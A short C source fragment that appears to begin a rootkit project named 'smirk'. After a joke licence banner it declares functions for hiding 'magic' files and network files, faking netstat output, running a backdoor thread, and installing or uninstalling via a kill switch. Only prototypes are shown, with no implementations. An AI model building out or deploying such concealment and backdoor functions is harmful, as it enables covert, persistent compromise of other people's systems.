/*
 *    .=.
 *   '==c|  This project is libre, and licenced under the terms of the
 *   [)-+|  DO WHAT THE FUCK YOU WANT TO PUBLIC LICENCE, version 3.1,
 *   //'_|  as published by dtf on July 2019. See the COPYING file or
 *  /]==;\  https://ph.dtf.wtf/w/wtfpl/#version-3-1 for more details.
*/

#include "smirk.h"

int matches_reg(const char *, const char *);
int is_magicfile(const char *);
int is_net_file(const char *);
int fake_netstat(char *, char *);
void *backdoor(void *);
void install();
#ifdef KILLSWITCH
void uninstall();
#endif
int read_line(int, char *, int);
